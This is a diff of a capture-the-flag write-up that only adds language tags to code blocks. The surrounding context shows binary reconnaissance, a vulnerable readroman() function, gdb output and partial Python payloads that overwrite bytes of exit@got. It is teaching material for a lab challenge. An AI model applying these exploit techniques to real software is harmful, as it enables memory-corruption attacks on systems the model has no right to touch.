@@ -10,7 +10,7 @@ Download the zip, then extract it and let's start!
 
 First, we will use `file` and `checksec` to get the basic information:
 
-```
+```bash
 $ file chall
 chall: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=56e9bd22c71b88be6d1f336fcfcc733584d27d8c, for GNU/Linux 3.2.0, not stripped
 
@@ -26,7 +26,7 @@ We can see that `Canary found` so buffer overflow cannot be done. But we can als
 
 Next, we will read the source code to get the flow and we know that the function readroman() is absolutely interesting:
 
-```
+```c
 short readroman(){
     short res = 0;
     std::string s;
@@ -55,7 +55,7 @@ Then, it will compare our string from bottom to up with the character of `c` fro
 
 You can modify the code to print the character `c` one by one like this:
 
-```
+```c
 short readroman(){
     ...
     for (auto c: "IXCM") {
@@ -92,7 +92,7 @@ Summary:
 
 Remember that our input string will be check from bottom to up so our payload will look like this:
 
-```
+```python
 payload = b'\x00'*a
 payload += b'M'*b
 payload += b'C'*c
@@ -102,7 +102,7 @@ payload += b'I'*e
 
 With a, b, c, d, e we will use gdb and check until we find the correct number. After a while trying, we got this update payload for `ind`:
 
-```
+```python
 payload = b'\x00'*6
 payload += b'M'*5
 payload += b'C'*1
@@ -112,7 +112,7 @@ payload += b'I'*4
 
 Send that payload and we pause the program to attach gdb, then set breakpoint to check the address:
 
-```
+```bash
 gef➤  disas main
    ...
    0x0000000000401562 <+205>:	lea    rdx,[rax+rax*1]
@@ -140,7 +140,7 @@ Notice the breakpoint above, it move `cx` to the address, which we made it point
 
 So we will need to write `4854` to last 2 bytes of exit@got and we have this second payload:
 
-```
+```python
 payload = b'M'*4      # 4000
 payload += b'C'*8     #  800
 payload += b'X'*5     #   50
